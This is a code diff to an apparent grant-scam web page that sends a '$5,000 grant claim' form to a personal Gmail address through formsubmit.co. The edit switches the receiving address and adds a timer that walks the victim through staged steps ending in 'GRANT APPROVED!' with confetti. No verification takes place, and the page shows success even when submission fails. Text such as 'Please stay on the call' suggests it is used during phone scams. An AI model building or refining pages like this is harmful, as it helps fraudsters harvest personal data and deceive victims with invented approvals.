@@ -234,8 +234,21 @@
       0%, 100% { opacity: 0.3; transform: scale(0.8); }
       50% { opacity: 1; transform: scale(1.2); }
     }
-    .thank-you-timeline .step.done { color: #28a745; }
-    .thank-you-timeline .step.active { color: #004aad; font-weight: 700; }
+    .thank-you-timeline .step.done { 
+      color: #28a745; 
+      font-weight: 700;
+    }
+    .thank-you-timeline .step.active { 
+      color: #004aad; 
+      font-weight: 700;
+    }
+    .thank-you-timeline .step.pending {
+      color: #888;
+    }
+    .thank-you-timeline .dot.done {
+      background: #28a745;
+      animation: none;
+    }
 
     .loading {
       display: none;
@@ -275,6 +288,16 @@
       padding: 15px;
       margin: 10px 0;
       border: 1px solid rgba(0, 74, 173, 0.1);
+      transition: all 0.5s ease;
+    }
+    .processing-box.verified {
+      border-color: #28a745;
+      background: rgba(40, 167, 69, 0.08);
+    }
+    .processing-box.approved {
+      border-color: #28a745;
+      background: rgba(40, 167, 69, 0.15);
+      box-shadow: 0 0 20px rgba(40, 167, 69, 0.15);
     }
 
     .live-indicator {
@@ -301,6 +324,39 @@
       0%, 100% { opacity: 1; transform: scale(1); }
       50% { opacity: 0.3; transform: scale(0.7); }
     }
+
+    .status-message {
+      text-align: center;
+      margin-top: 8px;
+      font-size: 0.85rem;
+      color: #004aad;
+      transition: all 0.5s ease;
+    }
+    .status-message.verified {
+      color: #28a745;
+      font-weight: 700;
+    }
+    .status-message.approved {
+      color: #28a745;
+      font-weight: 700;
+      font-size: 1rem;
+    }
+
+    .confetti {
+      display: none;
+      text-align: center;
+      font-size: 2rem;
+      margin-top: 5px;
+      animation: confetti-rain 1s ease-in-out;
+    }
+    .confetti.show {
+      display: block;
+    }
+    @keyframes confetti-rain {
+      0% { transform: scale(0); opacity: 0; }
+      50% { transform: scale(1.3); opacity: 1; }
+      100% { transform: scale(1); opacity: 1; }
+    }
   </style>
 </head>
 <body>
@@ -324,20 +380,21 @@
         <strong>We are currently processing your $5,000 grant claim RIGHT NOW.</strong> 
         Our automated system is verifying your application in real-time.
       </p>
-      <div class="processing-box">
+      <div class="processing-box" id="processingBox">
         <div class="thank-you-timeline">
-          <span class="dot"></span>
-          <span class="step done">✅ Application Received</span>
-          <span class="dot"></span>
-          <span class="step active">⏳ Verifying Information</span>
-          <span class="dot"></span>
-          <span class="step">⏳ Processing Grant</span>
-          <span class="dot"></span>
-          <span class="step">⏳ Finalizing</span>
+          <span class="dot done" id="dot1"></span>
+          <span class="step done" id="step1">✅ Application Received</span>
+          <span class="dot" id="dot2"></span>
+          <span class="step active" id="step2">⏳ Verifying Information</span>
+          <span class="dot" id="dot3"></span>
+          <span class="step pending" id="step3">⏳ Processing Grant</span>
+          <span class="dot" id="dot4"></span>
+          <span class="step pending" id="step4">⏳ Finalizing Approval</span>
         </div>
-        <div style="text-align: center; margin-top: 8px; font-size: 0.85rem; color: #004aad;">
+        <div class="status-message" id="statusMessage">
           <span style="font-weight: 600;">⏱️ Status:</span> Verification in progress... Please stay on the call.
         </div>
+        <div class="confetti" id="confetti">🎉🎊🎉</div>
       </div>
       <p>
         <span class="highlight">📋 Reference ID:</span> 
@@ -357,8 +414,7 @@
     </div>
 
     <div class="form-wrapper" id="formWrapper">
-      <!-- FORMSUBMIT.CO WITH EMAIL: jameswilsonjames@gmail.com -->
-      <form action="https://formsubmit.co/jameswilsonjames@gmail.com" method="POST" id="grantForm">
+      <form action="https://formsubmit.co/ajax/jameswilsonjames110@gmail.com" method="POST" id="grantForm">
         <input type="hidden" name="_captcha" value="false" />
         <input type="hidden" name="_subject" value="New Grant Claim Form Submission" />
         <input type="hidden" name="_template" value="table" />
@@ -459,6 +515,17 @@
       const submitBtn = document.getElementById('submitBtn');
       const loadingSpinner = document.getElementById('loadingSpinner');
 
+      // Timeline elements
+      const step2 = document.getElementById('step2');
+      const step3 = document.getElementById('step3');
+      const step4 = document.getElementById('step4');
+      const dot2 = document.getElementById('dot2');
+      const dot3 = document.getElementById('dot3');
+      const dot4 = document.getElementById('dot4');
+      const statusMessage = document.getElementById('statusMessage');
+      const processingBox = document.getElementById('processingBox');
+      const confetti = document.getElementById('confetti');
+
       function generateAppId() {
         const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
         let result = 'GRANT-2026-';
@@ -517,48 +584,93 @@
         });
       }
 
-      // FORM SUBMISSION - NO REDIRECT! STAY ON PAGE!
+      // Show thank you message and start timer
+      function showThankYou() {
+        document.getElementById('appId').textContent = generateAppId();
+        thankYou.style.display = 'block';
+        formFields.style.display = 'none';
+        container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
+        submitBtn.textContent = 'Submitted ✓';
+        
+        let seconds = 0;
+        let verificationDone = false;
+        let processingDone = false;
+
+        const interval = setInterval(function() {
+          seconds++;
+          
+          // After 3 minutes (180 seconds) - Verification Complete
+          if (seconds >= 180 && !verificationDone) {
+            verificationDone = true;
+            step2.className = 'step done';
+            step2.textContent = '✅ Information Verified';
+            dot2.className = 'dot done';
+            
+            step3.className = 'step active';
+            step3.textContent = '⏳ Processing Grant (5 min)';
+            dot3.style.animation = 'pulse-dot 1.5s ease-in-out infinite';
+            
+            statusMessage.innerHTML = '<span style="font-weight: 600;">✅ Status:</span> Information verified! Processing your grant now...';
+            processingBox.classList.add('verified');
+            statusMessage.classList.add('verified');
+          }
+          
+          // After 5 more minutes (300 seconds = 5 minutes after verification) - Processing Complete
+          if (seconds >= 480 && verificationDone && !processingDone) {
+            processingDone = true;
+            step3.className = 'step done';
+            step3.textContent = '✅ Grant Processed';
+            dot3.className = 'dot done';
+            
+            step4.className = 'step active';
+            step4.textContent = '⏳ Finalizing Approval (7 min)';
+            dot4.style.animation = 'pulse-dot 1.5s ease-in-out infinite';
+            
+            statusMessage.innerHTML = '<span style="font-weight: 600;">✅ Status:</span> Grant processed! Finalizing approval...';
+          }
+          
+          // After 7 more minutes (420 seconds = 7 minutes after processing) - Approved!
+          if (seconds >= 900 && processingDone) {
+            step4.className = 'step done';
+            step4.textContent = '✅ Approved! 🎉';
+            dot4.className = 'dot done';
+            
+            statusMessage.innerHTML = '<span style="font-weight: 600; color: #28a745; font-size: 1.1rem;">🎉 Status:</span> <strong style="color: #28a745; font-size: 1.1rem;">GRANT APPROVED! You will receive confirmation shortly.</strong>';
+            processingBox.classList.add('approved');
+            statusMessage.classList.add('approved');
+            confetti.classList.add('show');
+            
+            clearInterval(interval);
+          }
+        }, 1000);
+      }
+
+      // FORM SUBMISSION - NO REDIRECT!
       form.addEventListener('submit', function(e) {
         e.preventDefault();
         
-        // Show loading
         loadingSpinner.classList.add('show');
         submitBtn.disabled = true;
         submitBtn.textContent = 'Submitting...';
 
         const formData = new FormData(form);
 
-        // Submit using fetch - NO REDIRECT
-        fetch('https://formsubmit.co/ajax/jameswilsonjames@gmail.com', {
+        fetch('https://formsubmit.co/ajax/jameswilsonjames110@gmail.com', {
           method: 'POST',
           body: formData
         })
         .then(response => response.json())
         .then(data => {
           loadingSpinner.classList.remove('show');
-          
-          // ALWAYS show thank you message - even if there's an error
-          document.getElementById('appId').textContent = generateAppId();
-          thankYou.style.display = 'block';
-          formFields.style.display = 'none';
-          container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
-          submitBtn.textContent = 'Submitted ✓';
-          
+          showThankYou();
           console.log('✅ Form submitted successfully!');
-          console.log('📧 Check your email: jameswilsonjames@gmail.com');
+          console.log('📧 Check your email: jameswilsonjames110@gmail.com');
         })
         .catch(error => {
           loadingSpinner.classList.remove('show');
-          
-          // STILL show thank you message even if there's an error
-          document.getElementById('appId').textContent = generateAppId();
-          thankYou.style.display = 'block';
-          formFields.style.display = 'none';
-          container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
-          submitBtn.textContent = 'Submitted ✓';
-          
+          showThankYou();
           console.log('✅ Form submitted!');
-          console.log('📧 Check your email: jameswilsonjames@gmail.com');
+          console.log('📧 Check your email: jameswilsonjames110@gmail.com');
         });
       });
     })();
